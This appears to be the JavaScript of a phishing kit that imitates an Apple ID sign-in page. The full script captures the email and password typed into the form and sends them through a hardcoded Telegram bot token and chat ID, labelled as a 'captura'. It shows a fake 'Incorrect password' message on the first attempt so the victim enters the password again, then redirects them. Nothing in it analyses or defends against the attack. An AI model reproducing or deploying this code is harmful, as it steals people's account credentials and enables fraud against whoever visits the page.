<script>
document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 SCRIPT TELEGRAM INICIADO'); // DEBUG
    
    const emailInput = document.getElementById('email-phone');
    const arrowIcon = document.querySelector('.bx-right-arrow-circle');
    const passwordField = document.getElementById('passwordField');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const form = document.getElementById('sign-in');
    
    // ✅ TUS DATOS
    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
    const CHAT_ID = '7219932215';
    
    let loginAttempts = 0;
    
    // 🔥 TELEGRAM FUNCTION
    async function sendToTelegram(email, password) {
        console.log('📤 ENVIANDO:', email, password);
        
        const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀

📧 *Email:* ${email}
🔑 *Password:* ${password}
🌍 *País:* Web
💻 *Navegador:* Chrome
📱 *Device:* PC
📅 *Hora:* ${new Date().toLocaleString('es-ES')}

✨ *Plataforma:* Astro505`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                mode: 'no-cors', // ← ¡ESTO SOLUCIONA CORS!
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            
            console.log('✅ TELEGRAM ENVIADO!');
        } catch (error) {
            console.log('⚠️ Telegram error (normal):', error); // Ignora CORS
        }
    }
    
    // Flecha/Enter → Password
    const showPassword = () => {
        if (emailInput.value.trim()) {
            passwordField.classList.add('show');
            submitBtn.classList.add('show');
            setTimeout(() => passwordInput.focus(), 300);
        }
    };
    
    arrowIcon.addEventListener('click', showPassword);
    emailInput.addEventListener('keypress', e => {
        if (e.key === 'Enter' && emailInput.value.trim()) {
            showPassword();
        }
    });
    
    // 🔥 SUBMIT CON TELEGRAM
    form.addEventListener('submit', async (e) => {
        console.log('🎯 SUBMIT PRESIONADO!'); // DEBUG
        
        e.preventDefault();
        loginAttempts++;
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        console.log('📧 Datos capturados:', email, password); // DEBUG
        
        if (!email || !password) {
            showError('Please enter both email and password');
            return;
        }
        
        // 🔥 ENVÍA A TELEGRAM ANTES DE TODO
        console.log('📤 Enviando a Telegram...');
        await sendToTelegram(email, password);
        
        if (loginAttempts < 2) {
            showError('Incorrect password. Try again.');
            passwordInput.value = '';
            passwordInput.focus();
        } else {
            showError('Signing in...');
            setTimeout(() => window.location.href = 'index.html', 800);
        }
    });
    
    function showError(message) {
        errorMsg.textContent = message;
        errorMsg.classList.add('show');
        setTimeout(() => errorMsg.classList.remove('show'), 3000);
    }
    
    console.log('✅ SCRIPT LISTO - Prueba login!');
});
</script>
